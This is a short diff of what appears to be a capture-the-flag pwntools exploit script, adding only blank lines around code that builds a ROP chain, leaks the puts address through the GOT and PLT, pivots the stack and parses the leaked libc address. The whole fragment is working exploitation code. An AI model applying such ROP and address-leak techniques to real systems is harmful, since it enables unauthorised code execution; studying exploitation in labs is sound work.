@@ -185,8 +185,10 @@ pop_rdi_rbp = 0x4025e0
 pop_rsp_rbp = 0x404ac7
 ret = 0x40201a
 rop = [0,pop_rdi_rbp, exe.got.puts, 0, exe.plt.puts, exe.sym.main]
+
 io = start()
 prompt(b"".join([p64(g) for g in rop]))
+
 good_prime = 59
 offset = 0x409eac
 for i in range(32):
@@ -199,6 +201,7 @@ for i in range(32):
         prompti(pop_rsp_rbp)
 prompti(2)
 prompti(offset)
+
 l = io.recvuntil(b"research").split(b"atomic ")[0][-7:-1]
 puts_addr = unpack(l,'all')
 log.info(f"puts : 0x{puts_addr:x}")
